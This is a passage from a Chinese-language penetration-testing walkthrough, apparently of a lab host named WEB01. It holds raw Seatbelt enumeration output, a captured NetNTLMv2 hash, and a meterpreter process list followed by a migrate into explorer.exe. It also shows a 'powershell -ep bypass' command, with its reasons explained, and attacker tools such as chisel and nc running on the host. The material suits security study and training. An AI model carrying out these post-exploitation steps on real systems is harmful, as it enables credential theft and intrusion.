  AltDefaultUserName             :
  AltDefaultPassword             :

====== WindowsCredentialFiles ======

  Folder : C:\Users\svc_dev\AppData\Local\Microsoft\Credentials\

    FileName     : 6C0FA35116FC27371A650B528FAEE6C0
    Description  : Local Credential Data

    MasterKey    : 67f368d2-3d19-4912-89fc-643c7288b37d
    Accessed     : 9/27/2024 7:05:04 AM
    Modified     : 9/27/2024 7:05:04 AM
    Size         : 560

    FileName     : 83FEBF0027B9D0D06E0C8820B4C65F4D
    Description  : Local Credential Data

    MasterKey    : 67f368d2-3d19-4912-89fc-643c7288b37d
    Accessed     : 9/27/2024 7:04:28 AM
    Modified     : 9/27/2024 7:04:28 AM
    Size         : 512


====== WindowsDefender ======

Locally-defined Settings:



GPO-defined Settings:
====== WindowsEventForwarding ======

====== WindowsFirewall ======

Collecting Windows Firewall Non-standard Rules


Location                     : SOFTWARE\Policies\Microsoft\WindowsFirewall

Location                     : SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy

Domain Profile
    Enabled                  : True
    DisableNotifications     : True
    DefaultInboundAction     : ALLOW
    DefaultOutboundAction    : ALLOW

Public Profile
    Enabled                  : True
    DisableNotifications     : True
    DefaultInboundAction     : ALLOW
    DefaultOutboundAction    : ALLOW

Standard Profile
    Enabled                  : True
    DisableNotifications     : True
    DefaultInboundAction     : ALLOW
    DefaultOutboundAction    : ALLOW

Rules:

  Name                 : Block Ports
  Description          :
  ApplicationName      :
  Protocol             : TCP
  Action               : Block
  Direction            : In
  Profiles             :
  Local Addr:Port      : :445
  Remote Addr:Port     : 10.14.14.0/255.255.254.0:

====== WindowsVault ======

ERROR: Unable to enumerate vaults. Error code: 1061
====== WMI ======

ERROR:   [!] Terminating exception running command 'WMI': System.Management.ManagementException: Access denied
   at System.Management.ThreadDispatch.Start()
   at System.Management.ManagementScope.Initialize()
   at System.Management.ManagementObjectSearcher.Initialize()
   at System.Management.ManagementObjectSearcher.Get()
   at AnschnallGurt.Commands.Windows.WMICommand.<Execute>d__10.MoveNext()
   at AnschnallGurt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
====== WMIEventConsumer ======

ERROR:   [!] Terminating exception running command 'WMIEventConsumer': System.Management.ManagementException: Access denied
   at System.Management.ThreadDispatch.Start()
   at System.Management.ManagementScope.Initialize()
   at System.Management.ManagementObject.Initialize(Boolean getObject)
   at System.Management.ManagementClass.GetInstances(EnumerationOptions options)
   at AnschnallGurt.Commands.Windows.WMIEventConsumerCommand.<Execute>d__9.MoveNext()
   at AnschnallGurt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
====== WMIEventFilter ======

ERROR:   [!] Terminating exception running command 'WMIEventFilter': System.Management.ManagementException: Access denied
   at System.Management.ThreadDispatch.Start()
   at System.Management.ManagementScope.Initialize()
   at System.Management.ManagementObject.Initialize(Boolean getObject)
   at System.Management.ManagementClass.GetInstances(EnumerationOptions options)
   at AnschnallGurt.Commands.Windows.WmiEventFilterCommand.<Execute>d__9.MoveNext()
   at AnschnallGurt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
====== WMIFilterBinding ======

ERROR:   [!] Terminating exception running command 'WMIFilterBinding': System.Management.ManagementException: Access denied
   at System.Management.ThreadDispatch.Start()
   at System.Management.ManagementScope.Initialize()
   at System.Management.ManagementObject.Initialize(Boolean getObject)
   at System.Management.ManagementClass.GetInstances(EnumerationOptions options)
   at AnschnallGurt.Commands.Windows.WMIFilterToConsumerBindingCommand.<Execute>d__9.MoveNext()
   at AnschnallGurt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
====== WSUS ======

  UseWUServer                    : False
  Server                         :
  AlternateServer                :
  StatisticsServer               :



[*] Completed collection in 135.052 seconds
```

### 敏感信息
```bash
====== SecPackageCreds ======
  Version                        : NetNTLMv2
  Hash                           : svc_dev::WEB01:1122334455667788:e097f4ccd04828da4c523ad0ca2a3d60:0101000000000000861c6433afbbdc01347b2cd46950f17e00000000080030003000000000000000000000000020000
```

## 进程迁移
> 为什么要迁移到 Session 1？
>
> 1.  我们的 shell 是 Session 0（Network Logon），无法访问用户的 DPAPI 密钥库和凭据管理器
> 2.  Session 1 是 svc_dev 的交互式桌面 session（Interactive Logon）
> 3. Seatbelt 的 CredEnum 和 ScheduledTasks 需要在交互式 session 中才能读取完整数据
>

### 查询进程
> 找 Session 列为 1 的进程
>

```bash
meterpreter > ps -U svc_dev
Filtering on user 'svc_dev'

Process List
============

 PID   PPID  Name    Arch  Session  User      Path
 ---   ----  ----    ----  -------  ----      ----
 480   6852  chisel  x64   0        WEB01\sv  C:\Users
             .exe                   c_dev     \svc_dev
                                              \Desktop
                                              \chisel.
                                              exe
 1732  8024  nc.exe  x64   0        WEB01\sv  C:\Users
                                    c_dev     \svc_dev
                                              \nc.exe
 2072  884   Runtim  x64   1        WEB01\sv  C:\Windo
             eBroke                 c_dev     ws\Syste
             r.exe                            m32\Runt
                                              imeBroke
                                              r.exe
 2172  2492  conhos  x64   0        WEB01\sv  C:\Windo
             t.exe                  c_dev     ws\Syste
                                              m32\conh
                                              ost.exe
 2460  5792  cmd.ex  x64   0        WEB01\sv  C:\Windo
             e                      c_dev     ws\Syste
                                              m32\cmd.
                                              exe
 2492  6852  ascens  x64   0        WEB01\sv  C:\Users
             ion.ex                 c_dev     \svc_dev
             e                                \Desktop
                                              \ascensi
                                              on.exe
 3564  2460  nc.exe  x64   0        WEB01\sv  C:\Users
                                    c_dev     \svc_dev
                                              \nc.exe
 4284  2460  conhos  x64   0        WEB01\sv  C:\Windo
             t.exe                  c_dev     ws\Syste
                                              m32\conh
                                              ost.exe
 4752  1732  cmd.ex  x64   0        WEB01\sv  C:\Windo
             e                      c_dev     ws\Syste
                                              m32\cmd.
                                              exe
 5008  4752  powers  x64   0        WEB01\sv  C:\Windo
             hell.e                 c_dev     ws\Syste
             xe                               m32\Wind
                                              owsPower
                                              Shell\v1
                                              .0\power
                                              shell.ex
                                              e
 5288  892   powers  x64   0        WEB01\sv  C:\Windo
             hell.e                 c_dev     ws\Syste
             xe                               m32\Wind
                                              owsPower
                                              Shell\v1
                                              .0\power
                                              shell.ex
                                              e
 6220  4768  conhos  x64   0        WEB01\sv  C:\Windo
             t.exe                  c_dev     ws\Syste
                                              m32\conh
                                              ost.exe
 6232  2404  sihost  x64   1        WEB01\sv  C:\Windo
             .exe                   c_dev     ws\Syste
                                              m32\siho
                                              st.exe
 6264  716   svchos  x64   1        WEB01\sv  C:\Windo
             t.exe                  c_dev     ws\Syste
                                              m32\svch
                                              ost.exe
 6288  716   svchos  x64   1        WEB01\sv  C:\Windo
             t.exe                  c_dev     ws\Syste
                                              m32\svch
                                              ost.exe
 6320  1832  taskho  x64   1        WEB01\sv  C:\Windo
             stw.ex                 c_dev     ws\Syste
             e                                m32\task
                                              hostw.ex
                                              e
 6412  884   Runtim  x64   1        WEB01\sv  C:\Windo
             eBroke                 c_dev     ws\Syste
             r.exe                            m32\Runt
                                              imeBroke
                                              r.exe
 6616  8024  conhos  x64   0        WEB01\sv  C:\Windo
             t.exe                  c_dev     ws\Syste
                                              m32\conh
                                              ost.exe
 6816  6796  explor  x64   1        WEB01\sv  C:\Windo
             er.exe                 c_dev     ws\explo
                                              rer.exe
 6852  3564  cmd.ex  x64   0        WEB01\sv  C:\Windo
             e                      c_dev     ws\Syste
                                              m32\cmd.
                                              exe
 7068  884   ShellE  x64   1        WEB01\sv  C:\Windo
             xperie                 c_dev     ws\Syste
             nceHos                           mApps\Sh
             t.exe                            ellExper
                                              ienceHos
                                              t_cw5n1h
                                              2txyewy\
                                              ShellExp
                                              erienceH
                                              ost.exe
 7164  884   Search  x64   1        WEB01\sv  C:\Windo
             UI.exe                 c_dev     ws\Syste
                                              mApps\Mi
                                              crosoft.
                                              Windows.
                                              Cortana_
                                              cw5n1h2t
                                              xyewy\Se
                                              archUI.e
                                              xe
 7232  6016  Synapt  x86   0        WEB01\sv  C:\Progr
             ics.ex                 c_dev     amData\S
             e                                ynaptics
                                              \Synapti
                                              cs.exe
 7264  5912  powers  x64   0        WEB01\sv  C:\Windo
             hell.e                 c_dev     ws\Syste
             xe                               m32\Wind
                                              owsPower
                                              Shell\v1
                                              .0\power
                                              shell.ex
                                              e
 7520  884   Runtim  x64   1        WEB01\sv  C:\Windo
             eBroke                 c_dev     ws\Syste
             r.exe                            m32\Runt
                                              imeBroke
                                              r.exe
 7584  6280  conhos  x64   0        WEB01\sv  C:\Windo
             t.exe                  c_dev     ws\Syste
                                              m32\conh
                                              ost.exe
 7848  6816  vmtool  x64   1        WEB01\sv  C:\Progr
             sd.exe                 c_dev     am Files
                                              \VMware\
                                              VMware T
                                              ools\vmt
                                              oolsd.ex
                                              e
 8024  5792  cmd.ex  x64   0        WEB01\sv  C:\Windo
             e                      c_dev     ws\Syste
                                              m32\cmd.
                                              exe

```

### 迁移进程
```bash
meterpreter > migrate 6816
[*] Migrating from 3052 to 6816...
[*] Migration completed successfully.
```

##  <font style="color:rgb(88, 90, 90);">Seatbelt</font>
```bash
powershell -ep bypass -c "Import-Module .\Invoke-Seatbelt.ps1; Invoke-Seatbelt -Command '-group=all'"
```

```bash
PS > powershell -ep bypass -c "Import-Module .\Invoke-Seatbelt.ps1; Invoke-Seatbelt -Command '-group=all'"

====== AMSIProviders ======

====== AntiVirus ======

Cannot enumerate antivirus. root\SecurityCenter2 WMI namespace is not available on Windows Servers
====== AppLocker ======

  [*] AppIDSvc service is Stopped

    [*] Applocker is not running because the AppIDSvc is not running

  [*] AppLocker not configured
====== ARPTable ======

  Loopback Pseudo-Interface 1 --- Index 1
    Interface Description : Software Loopback Interface 1
    Interface IPs      : ::1, 127.0.0.1
    DNS Servers        : fec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1

    Internet Address      Physical Address      Type
    224.0.0.22            00-00-00-00-00-00     Static
    239.255.255.250       00-00-00-00-00-00     Static


  Ethernet0 2 --- Index 12
    Interface Description : vmxnet3 Ethernet Adapter
    Interface IPs      : 10.13.38.20
    DNS Servers        : 192.168.10.6

    Internet Address      Physical Address      Type
    10.13.38.2            00-50-56-94-76-73     Dynamic
    10.13.38.255          FF-FF-FF-FF-FF-FF     Static
    224.0.0.22            01-00-5E-00-00-16     Static
    224.0.0.251           01-00-5E-00-00-FB     Static
    224.0.0.252           01-00-5E-00-00-FC     Static


  Ethernet1 --- Index 16
    Interface Description : vmxnet3 Ethernet Adapter #3
    Interface IPs      : 192.168.10.39
    DNS Servers        : 192.168.10.6

    Internet Address      Physical Address      Type
    192.168.10.1          00-00-00-00-00-00     Invalid
    192.168.10.2          00-00-00-00-00-00     Invalid
    192.168.10.3          00-00-00-00-00-00     Invalid
    192.168.10.4          00-00-00-00-00-00     Invalid
    192.168.10.5          00-00-00-00-00-00     Invalid
    192.168.10.6          00-50-56-94-99-FB     Dynamic
    192.168.10.7          00-00-00-00-00-00     Invalid
    192.168.10.8          00-00-00-00-00-00     Invalid
    192.168.10.9          00-00-00-00-00-00     Invalid
    192.168.10.10         00-00-00-00-00-00     Invalid
    192.168.10.11         00-00-00-00-00-00     Invalid
    192.168.10.12         00-00-00-00-00-00     Invalid
    192.168.10.13         00-00-00-00-00-00     Invalid
    192.168.10.14         00-00-00-00-00-00     Invalid
    192.168.10.15         00-00-00-00-00-00     Invalid
    192.168.10.16         00-00-00-00-00-00     Invalid
    192.168.10.17         00-00-00-00-00-00     Invalid
    192.168.10.18         00-00-00-00-00-00     Invalid
    192.168.10.19         00-00-00-00-00-00     Invalid
    192.168.10.20         00-00-00-00-00-00     Invalid
    192.168.10.21         00-00-00-00-00-00     Invalid
    192.168.10.22         00-00-00-00-00-00     Invalid
    192.168.10.23         00-00-00-00-00-00     Invalid
    192.168.10.24         00-00-00-00-00-00     Invalid
    192.168.10.25         00-00-00-00-00-00     Invalid
    192.168.10.26         00-00-00-00-00-00     Invalid
    192.168.10.27         00-00-00-00-00-00     Invalid
    192.168.10.28         00-00-00-00-00-00     Invalid
    192.168.10.29         00-00-00-00-00-00     Invalid
    192.168.10.30         00-00-00-00-00-00     Invalid
    192.168.10.31         00-00-00-00-00-00     Invalid
    192.168.10.32         00-00-00-00-00-00     Invalid
    192.168.10.33         00-00-00-00-00-00     Invalid
    192.168.10.34         00-00-00-00-00-00     Invalid
    192.168.10.35         00-00-00-00-00-00     Invalid
    192.168.10.36         00-00-00-00-00-00     Invalid
    192.168.10.37         00-00-00-00-00-00     Invalid
    192.168.10.38         00-00-00-00-00-00     Invalid
    192.168.10.40         00-00-00-00-00-00     Invalid
    192.168.10.41         00-00-00-00-00-00     Invalid
    192.168.10.42         00-00-00-00-00-00     Invalid
    192.168.10.43         00-00-00-00-00-00     Invalid
    192.168.10.44         00-00-00-00-00-00     Invalid
    192.168.10.45         00-00-00-00-00-00     Invalid
    192.168.10.46         00-00-00-00-00-00     Invalid
    192.168.10.47         00-00-00-00-00-00     Invalid
    192.168.10.48         00-00-00-00-00-00     Invalid
    192.168.10.49         00-00-00-00-00-00     Invalid
    192.168.10.50         00-00-00-00-00-00     Invalid
    192.168.10.51         00-00-00-00-00-00     Invalid
    192.168.10.52         00-00-00-00-00-00     Invalid
    192.168.10.53         00-00-00-00-00-00     Invalid
    192.168.10.54         00-00-00-00-00-00     Invalid
    192.168.10.55         00-00-00-00-00-00     Invalid
    192.168.10.56         00-00-00-00-00-00     Invalid
    192.168.10.57         00-00-00-00-00-00     Invalid
    192.168.10.58         00-00-00-00-00-00     Invalid
    192.168.10.59         00-00-00-00-00-00     Invalid
    192.168.10.60         00-00-00-00-00-00     Invalid
    192.168.10.61         00-00-00-00-00-00     Invalid
    192.168.10.62         00-00-00-00-00-00     Invalid
    192.168.10.63         00-00-00-00-00-00     Invalid
    192.168.10.64         00-00-00-00-00-00     Invalid
    192.168.10.65         00-00-00-00-00-00     Invalid
    192.168.10.66         00-00-00-00-00-00     Invalid
    192.168.10.67         00-00-00-00-00-00     Invalid
    192.168.10.68         00-00-00-00-00-00     Invalid
    192.168.10.69         00-00-00-00-00-00     Invalid
    192.168.10.70         00-00-00-00-00-00     Invalid
    192.168.10.71         00-00-00-00-00-00     Invalid
    192.168.10.72         00-00-00-00-00-00     Invalid
    192.168.10.73         00-00-00-00-00-00     Invalid
    192.168.10.74         00-00-00-00-00-00     Invalid
    192.168.10.75         00-00-00-00-00-00     Invalid
    192.168.10.76         00-00-00-00-00-00     Invalid
    192.168.10.77         00-00-00-00-00-00     Invalid
    192.168.10.78         00-00-00-00-00-00     Invalid
    192.168.10.79         00-00-00-00-00-00     Invalid
    192.168.10.80         00-00-00-00-00-00     Invalid
    192.168.10.81         00-00-00-00-00-00     Invalid
    192.168.10.82         00-00-00-00-00-00     Invalid
    192.168.10.83         00-00-00-00-00-00     Invalid
    192.168.10.84         00-00-00-00-00-00     Invalid
    192.168.10.85         00-00-00-00-00-00     Invalid
    192.168.10.86         00-00-00-00-00-00     Invalid
    192.168.10.87         00-00-00-00-00-00     Invalid
    192.168.10.88         00-00-00-00-00-00     Invalid
    192.168.10.89         00-00-00-00-00-00     Invalid
    192.168.10.90         00-00-00-00-00-00     Invalid
    192.168.10.91         00-00-00-00-00-00     Invalid
    192.168.10.92         00-00-00-00-00-00     Invalid
    192.168.10.93         00-00-00-00-00-00     Invalid
    192.168.10.94         00-00-00-00-00-00     Invalid
    192.168.10.95         00-00-00-00-00-00     Invalid
    192.168.10.96         00-00-00-00-00-00     Invalid
    192.168.10.97         00-00-00-00-00-00     Invalid
    192.168.10.98         00-00-00-00-00-00     Invalid
    192.168.10.99         00-00-00-00-00-00     Invalid
    192.168.10.100        00-00-00-00-00-00     Invalid
    192.168.10.101        00-00-00-00-00-00     Invalid
    192.168.10.102        00-00-00-00-00-00     Invalid
    192.168.10.103        00-00-00-00-00-00     Invalid
    192.168.10.104        00-00-00-00-00-00     Invalid
    192.168.10.105        00-00-00-00-00-00     Invalid
    192.168.10.106        00-00-00-00-00-00     Invalid
    192.168.10.107        00-00-00-00-00-00     Invalid
    192.168.10.108        00-00-00-00-00-00     Invalid
    192.168.10.109        00-00-00-00-00-00     Invalid
    192.168.10.110        00-00-00-00-00-00     Invalid
    192.168.10.111        00-00-00-00-00-00     Invalid
    192.168.10.112        00-00-00-00-00-00     Invalid
    192.168.10.113        00-00-00-00-00-00     Invalid
    192.168.10.114        00-00-00-00-00-00     Invalid
    192.168.10.115        00-00-00-00-00-00     Invalid
    192.168.10.116        00-00-00-00-00-00     Invalid
    192.168.10.117        00-00-00-00-00-00     Invalid
    192.168.10.118        00-00-00-00-00-00     Invalid
    192.168.10.119        00-00-00-00-00-00     Invalid
    192.168.10.120        00-00-00-00-00-00     Invalid
    192.168.10.121        00-00-00-00-00-00     Invalid
    192.168.10.122        00-00-00-00-00-00     Invalid
    192.168.10.123        00-00-00-00-00-00     Invalid
    192.168.10.124        00-00-00-00-00-00     Invalid
    192.168.10.125        00-00-00-00-00-00     Invalid
    192.168.10.126        00-00-00-00-00-00     Invalid
    192.168.10.127        00-00-00-00-00-00     Invalid
    192.168.10.128        00-00-00-00-00-00     Invalid
    192.168.10.129        00-00-00-00-00-00     Invalid
    192.168.10.130        00-00-00-00-00-00     Invalid
    192.168.10.131        00-00-00-00-00-00     Invalid
    192.168.10.132        00-00-00-00-00-00     Invalid
    192.168.10.133        00-00-00-00-00-00     Invalid
    192.168.10.134        00-00-00-00-00-00     Invalid
    192.168.10.135        00-00-00-00-00-00     Invalid
    192.168.10.136        00-00-00-00-00-00     Invalid
    192.168.10.137        00-00-00-00-00-00     Invalid
    192.168.10.138        00-00-00-00-00-00     Invalid
    192.168.10.139        00-00-00-00-00-00     Invalid
    192.168.10.140        00-00-00-00-00-00     Invalid
    192.168.10.141        00-00-00-00-00-00     Invalid
    192.168.10.142        00-00-00-00-00-00     Invalid
    192.168.10.143        00-00-00-00-00-00     Invalid
    192.168.10.144        00-00-00-00-00-00     Invalid
    192.168.10.145        00-00-00-00-00-00     Invalid
    192.168.10.146        00-00-00-00-00-00     Invalid
    192.168.10.147        00-00-00-00-00-00     Invalid
    192.168.10.148        00-00-00-00-00-00     Invalid
    192.168.10.149        00-00-00-00-00-00     Invalid
    192.168.10.150        00-00-00-00-00-00     Invalid
    192.168.10.151        00-00-00-00-00-00     Invalid
    192.168.10.152        00-00-00-00-00-00     Invalid
    192.168.10.153        00-00-00-00-00-00     Invalid
    192.168.10.154        00-00-00-00-00-00     Invalid
    192.168.10.155        00-00-00-00-00-00     Invalid
    192.168.10.156        00-00-00-00-00-00     Invalid
    192.168.10.157        00-00-00-00-00-00     Invalid
    192.168.10.158        00-00-00-00-00-00     Invalid
    192.168.10.159        00-00-00-00-00-00     Invalid
    192.168.10.160        00-00-00-00-00-00     Invalid
    192.168.10.161        00-00-00-00-00-00     Invalid
    192.168.10.162        00-00-00-00-00-00     Invalid
    192.168.10.163        00-00-00-00-00-00     Invalid
    192.168.10.164        00-00-00-00-00-00     Invalid
    192.168.10.165        00-00-00-00-00-00     Invalid
    192.168.10.166        00-00-00-00-00-00     Invalid
    192.168.10.167        00-00-00-00-00-00     Invalid
    192.168.10.168        00-00-00-00-00-00     Invalid
    192.168.10.169        00-00-00-00-00-00     Invalid
    192.168.10.170        00-00-00-00-00-00     Invalid
    192.168.10.171        00-00-00-00-00-00     Invalid
    192.168.10.172        00-00-00-00-00-00     Invalid
    192.168.10.173        00-00-00-00-00-00     Invalid
    192.168.10.174        00-00-00-00-00-00     Invalid
    192.168.10.175        00-00-00-00-00-00     Invalid
    192.168.10.176        00-00-00-00-00-00     Invalid
    192.168.10.177        00-00-00-00-00-00     Invalid
    192.168.10.178        00-00-00-00-00-00     Invalid
    192.168.10.179        00-00-00-00-00-00     Invalid
    192.168.10.180        00-00-00-00-00-00     Invalid
    192.168.10.181        00-00-00-00-00-00     Invalid
    192.168.10.182        00-00-00-00-00-00     Invalid
    192.168.10.183        00-00-00-00-00-00     Invalid
    192.168.10.184        00-00-00-00-00-00     Invalid
    192.168.10.185        00-00-00-00-00-00     Invalid
    192.168.10.186        00-00-00-00-00-00     Invalid
    192.168.10.187        00-00-00-00-00-00     Invalid
    192.168.10.188        00-00-00-00-00-00     Invalid
    192.168.10.189        00-00-00-00-00-00     Invalid
    192.168.10.190        00-00-00-00-00-00     Invalid
    192.168.10.191        00-00-00-00-00-00     Invalid
    192.168.10.192        00-00-00-00-00-00     Invalid
    192.168.10.193        00-00-00-00-00-00     Invalid
    192.168.10.194        00-00-00-00-00-00     Invalid
    192.168.10.195        00-00-00-00-00-00     Invalid
    192.168.10.196        00-00-00-00-00-00     Invalid
    192.168.10.197        00-00-00-00-00-00     Invalid
    192.168.10.198        00-00-00-00-00-00     Invalid
    192.168.10.199        00-00-00-00-00-00     Invalid
    192.168.10.200        00-00-00-00-00-00     Invalid
    192.168.10.201        00-00-00-00-00-00     Invalid
    192.168.10.202        00-00-00-00-00-00     Invalid
    192.168.10.203        00-00-00-00-00-00     Invalid
    192.168.10.204        00-00-00-00-00-00     Invalid
    192.168.10.205        00-00-00-00-00-00     Invalid
    192.168.10.206        00-00-00-00-00-00     Invalid
    192.168.10.207        00-00-00-00-00-00     Invalid
    192.168.10.208        00-00-00-00-00-00     Invalid
    192.168.10.209        00-00-00-00-00-00     Invalid
    192.168.10.210        00-00-00-00-00-00     Invalid
    192.168.10.211        00-00-00-00-00-00     Invalid
    192.168.10.212        00-00-00-00-00-00     Invalid
    192.168.10.213        00-00-00-00-00-00     Invalid
    192.168.10.214        00-00-00-00-00-00     Invalid
    192.168.10.215        00-00-00-00-00-00     Invalid
    192.168.10.216        00-00-00-00-00-00     Invalid
    192.168.10.217        00-00-00-00-00-00     Invalid
    192.168.10.218        00-00-00-00-00-00     Invalid
    192.168.10.219        00-00-00-00-00-00     Invalid
    192.168.10.220        00-00-00-00-00-00     Invalid
    192.168.10.221        00-00-00-00-00-00     Invalid
    192.168.10.222        00-00-00-00-00-00     Invalid
    192.168.10.223        00-00-00-00-00-00     Invalid
    192.168.10.224        00-00-00-00-00-00     Invalid
    192.168.10.225        00-00-00-00-00-00     Invalid
    192.168.10.226        00-00-00-00-00-00     Invalid
    192.168.10.227        00-00-00-00-00-00     Invalid
    192.168.10.228        00-00-00-00-00-00     Invalid
    192.168.10.229        00-00-00-00-00-00     Invalid
    192.168.10.230        00-00-00-00-00-00     Invalid
    192.168.10.231        00-00-00-00-00-00     Invalid
    192.168.10.232        00-00-00-00-00-00     Invalid
    192.168.10.233        00-00-00-00-00-00     Invalid
    192.168.10.234        00-00-00-00-00-00     Invalid
    192.168.10.235        00-00-00-00-00-00     Invalid
    192.168.10.236        00-00-00-00-00-00     Invalid
    192.168.10.237        00-00-00-00-00-00     Invalid
    192.168.10.238        00-00-00-00-00-00     Invalid
    192.168.10.239        00-00-00-00-00-00     Invalid
    192.168.10.240        00-00-00-00-00-00     Invalid
    192.168.10.241        00-00-00-00-00-00     Invalid
    192.168.10.242        00-00-00-00-00-00     Invalid
    192.168.10.243        00-00-00-00-00-00     Invalid
    192.168.10.244        00-00-00-00-00-00     Invalid
    192.168.10.245        00-00-00-00-00-00     Invalid
    192.168.10.246        00-00-00-00-00-00     Invalid
    192.168.10.247        00-00-00-00-00-00     Invalid
    192.168.10.248        00-00-00-00-00-00     Invalid
    192.168.10.249        00-00-00-00-00-00     Invalid
    192.168.10.250        00-00-00-00-00-00     Invalid
    192.168.10.251        00-00-00-00-00-00     Invalid
    192.168.10.252        00-00-00-00-00-00     Invalid
    192.168.10.253        00-00-00-00-00-00     Invalid
    192.168.10.254        00-00-00-00-00-00     Invalid
    192.168.10.255        FF-FF-FF-FF-FF-FF     Static
    224.0.0.22            01-00-5E-00-00-16     Static
    224.0.0.251           01-00-5E-00-00-FB     Static
    224.0.0.252           01-00-5E-00-00-FC     Static
    239.255.255.250       01-00-5E-7F-FF-FA     Static


====== AuditPolicies ======

====== AuditPolicyRegistry ======

====== AutoRuns ======


  HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run :
    C:\WINDOWS\system32\SecurityHealthSystray.exe
    "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
====== azuread ======

    Could not enumerate NetAadJoinInfo
    SeamlessSignOnDomainTrusted : (not configured)
====== Certificates ======

====== CertificateThumbprints ======

CurrentUser\Root - 92B46C76E13054E104F230517E6E504D43AB10B5 (Symantec Enterprise Mobile Root for Microsoft) 3/14/2032 4:59:59 PM
CurrentUser\Root - 8F43288AD272F3103B6FB1428485EA3014C0BCFE (Microsoft Root Certificate Authority 2011) 3/22/2036 3:13:04 PM
CurrentUser\Root - 3B1EFD3A66EA28B16697394703A72CA340A05BD5 (Microsoft Root Certificate Authority 2010) 6/23/2035 3:04:01 PM
CurrentUser\Root - 31F9FC8BA3805986B721EA7295C65B3A44534274 (Microsoft ECC TS Root Certificate Authority 2018) 2/27/2043 1:00:12 PM
CurrentUser\Root - 06F1AA330B927B753A40E68CDF22E34BCBEF3352 (Microsoft ECC Product Root Certificate Authority 2018) 2/27/2043 12:50:46 PM
CurrentUser\Root - DF3C24F9BFD666761B268073FE06D1CC8D4F82A4 (DigiCert Global Root G2) 1/15/2038 4:00:00 AM
CurrentUser\Root - D1EB23A46D17D68FD92564C2F1F1601764D8E349 (AAA Certificate Services) 12/31/2028 3:59:59 PM
CurrentUser\Root - B1BC968BD4F49D622AA89A81F2150152A41D829C (GlobalSign Root CA) 1/28/2028 4:00:00 AM
CCurrentUser\Root - A8985D3A65E5E5C4B2D7D66D40C6DD2FB19C5436 (DigiCert Global Root CA) 11/9/2031 4:00:00 PM
CurrentUser\Root - 7E04DE896A3E666D00E687D33FFAD93BE83D349E (DigiCert Global Root G3) 1/15/2038 4:00:00 AM
CurrentUser\Root - 742C3192E607E424EB4549542BE1BBC53E6174E2 (Class 3 Public Primary Certification Authority) 8/1/2028 4:59:59 PM
CurrentUser\Root - 5FB7EE0633E259DBAD0C4C9AE6D38F1A61C7DC25 (DigiCert High Assurance EV Root CA) 11/9/2031 4:00:00 PM
CurrentUser\Root - 4EB6D578499B1CCF5F581EAD56BE3D9B6744A5E5 (VeriSign Class 3 Public Primary Certification Authority - G5) 7/16/2036 4:59:59 PM
CurrentUser\Root - 3679CA35668772304D30A5FB873B0FA77BB70D54 (VeriSign Universal Root Certification Authority) 12/1/2037 3:59:59 PM
CurrentUser\Root - 2796BAE63F1801E277261BA0D77770028F20EEE4 (Go Daddy Class 2 Certification Authority) 6/29/2034 10:06:20 AM
CurrentUser\Root - 0563B8630D62D75ABBC8AB1E4BDFB5A899B24D43 (DigiCert Assured ID Root CA) 11/9/2031 4:00:00 PM
LocalMachine\Root - 92B46C76E13054E104F230517E6E504D43AB10B5 (Symantec Enterprise Mobile Root for Microsoft) 3/14/2032 4:59:59 PM
LocalMachine\Root - 8F43288AD272F3103B6FB1428485EA3014C0BCFE (Microsoft Root Certificate Authority 2011) 3/22/2036 3:13:04 PM
LocalMachine\Root - 3B1EFD3A66EA28B16697394703A72CA340A05BD5 (Microsoft Root Certificate Authority 2010) 6/23/2035 3:04:01 PM
LocalMachine\Root - 31F9FC8BA3805986B721EA7295C65B3A44534274 (Microsoft ECC TS Root Certificate Authority 2018) 2/27/2043 1:00:12 PM
LocalMachine\Root - 06F1AA330B927B753A40E68CDF22E34BCBEF3352 (Microsoft ECC Product Root Certificate Authority 2018) 2/27/2043 12:50:46 PM
LocalMachine\Root - DF3C24F9BFD666761B268073FE06D1CC8D4F82A4 (DigiCert Global Root G2) 1/15/2038 4:00:00 AM
LocalMachine\Root - D1EB23A46D17D68FD92564C2F1F1601764D8E349 (AAA Certificate Services) 12/31/2028 3:59:59 PM
LocalMachine\Root - B1BC968BD4F49D622AA89A81F2150152A41D829C (GlobalSign Root CA) 1/28/2028 4:00:00 AM
LocalMachine\Root - AD7E1C28B064EF8F6003402014C3D0E3370EB58A (Starfield Class 2 Certification Authority) 6/29/2034 10:39:16 AM
LocalMachine\Root - A8985D3A65E5E5C4B2D7D66D40C6DD2FB19C5436 (DigiCert Global Root CA) 11/9/2031 4:00:00 PM
LocalMachine\Root - 7E04DE896A3E666D00E687D33FFAD93BE83D349E (DigiCert Global Root G3) 1/15/2038 4:00:00 AM
LocalMachine\Root - 742C3192E607E424EB4549542BE1BBC53E6174E2 (Class 3 Public Primary Certification Authority) 8/1/2028 4:59:59 PM
LocalMachine\Root - 5FB7EE0633E259DBAD0C4C9AE6D38F1A61C7DC25 (DigiCert High Assurance EV Root CA) 11/9/2031 4:00:00 PM
LocalMachine\Root - 4EB6D578499B1CCF5F581EAD56BE3D9B6744A5E5 (VeriSign Class 3 Public Primary Certification Authority - G5) 7/16/2036 4:59:59 PM
LocalMachine\Root - 3679CA35668772304D30A5FB873B0FA77BB70D54 (VeriSign Universal Root Certification Authority) 12/1/2037 3:59:59 PM
LocalMachine\Root - 2796BAE63F1801E277261BA0D77770028F20EEE4 (Go Daddy Class 2 Certification Authority) 6/29/2034 10:06:20 AM
LocalMachine\Root - 0563B8630D62D75ABBC8AB1E4BDFB5A899B24D43 (DigiCert Assured ID Root CA) 11/9/2031 4:00:00 PM
CurrentUser\CertificateAuthority - 83DA05A9886F7658BE73ACF0A4930C0F99B92F01 (Microsoft Secure Server CA 2011) 10/18/2026 4:05:19 PM
CurrentUser\CertificateAuthority - FEE449EE0E3965A5246F000E87FDE2A065FD89D4 (Root Agency) 12/31/2039 3:59:59 PM
LocalMachine\CertificateAuthority - FEE449EE0E3965A5246F000E87FDE2A065FD89D4 (Root Agency) 12/31/2039 3:59:59 PM
CurrentUser\AuthRoot - DF3C24F9BFD666761B268073FE06D1CC8D4F82A4 (DigiCert Global Root G2) 1/15/2038 4:00:00 AM
